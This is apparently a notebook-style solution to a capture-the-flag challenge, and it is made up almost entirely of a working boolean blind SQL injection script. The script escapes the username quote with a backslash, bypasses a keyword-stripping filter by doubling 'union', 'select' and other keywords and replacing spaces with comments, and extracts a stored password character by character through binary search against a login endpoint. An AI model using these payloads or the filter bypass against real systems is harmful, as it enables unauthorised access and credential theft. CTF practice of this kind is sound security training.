```python
import requests
```

```python
username="\\"
# first five word of password is FLAG{
base_password=" union select * from users where"
base_password+=" (ascii(mid(password,1,1))<71 and ascii(mid(password,1,1))>69)" # F
base_password+=" and (ascii(mid(password,2,1))<77 and ascii(mid(password,2,1))>75)" # L
base_password+=" and (ascii(mid(password,3,1))<66 and ascii(mid(password,3,1))>64)" # A
base_password+=" and (ascii(mid(password,4,1))<72 and ascii(mid(password,4,1))>70)" # G

def waf(p):
    p = p.replace(" ", "/**/")
    p = p.replace("union", "uniunionon")
    p = p.replace("select", "seleselectct")
    p = p.replace("where", "whwhereere")
    p = p.replace("and", "aandnd")
    p = p.replace("or", "oorr")
    return p

def check(username, password):
    payload = waf(password) + '#'
    res = requests.post("https://sqli.chal.h4ck3r.quest/login", data={"username": username, "password": payload}).text
    print(res)
    return res == 'Welcome!'

check(username, base_password)
```

```python
# crack flag length
def binary_search(start, end):
    while start <= end:
        mid = int(start + (end - start) / 2)
        print(start, mid, end)
        password = base_password + f" and length(password)<{mid}"
        stat = check(username, password)
        if stat == True:
            end = mid - 1
        else:
            start = mid + 1
    return mid-1

binary_search(1, 500)
```

```python
import time

def crack_ascii(pos):
    start = 0
    end = 128
    while start <= end:
        mid = int(start + (end - start) / 2)
        print(start, mid, end)
        password = base_password + f" and (ascii(mid(password,{pos},1))<{mid})"
        time.sleep(0.25)
        stat = check(username, password)
        if stat == True:
            end = mid - 1
            if start > end:
                return end
        else:
            start = mid + 1
            if start > end:
                return mid
            
flag = ""
for i in range(1, 26):
    flag += chr(crack_ascii(i))
    print(flag, "\n")
```
